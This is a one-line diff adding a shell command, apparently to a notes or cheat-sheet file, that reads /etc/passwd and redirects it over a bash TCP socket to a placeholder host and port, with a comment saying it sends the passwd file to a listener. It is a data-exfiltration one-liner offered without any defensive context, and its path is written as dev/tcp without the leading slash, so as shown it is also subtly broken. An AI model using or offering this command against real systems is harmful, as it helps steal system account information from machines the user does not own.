@@ -1,0 +1,1 @@
+cat /etc/passwd > dev/tcp/<ipaddr>/<port> #send contents of passwd file to system listening on <port>
